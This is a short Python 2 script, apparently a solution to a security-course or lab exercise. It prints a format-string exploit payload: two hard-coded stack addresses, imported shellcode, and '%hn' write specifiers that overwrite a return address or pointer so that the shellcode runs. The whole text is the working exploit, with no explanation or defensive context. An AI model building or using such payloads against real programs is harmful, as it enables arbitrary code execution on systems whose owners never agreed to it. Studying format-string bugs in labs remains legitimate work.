from shellcode import shellcode


print "\x6c\xbf\xfe\xbf"+"\x6e\xbf\xfe\xbf"+shellcode+"%46920x.%04$hn"+"%2197x.%05$hn"


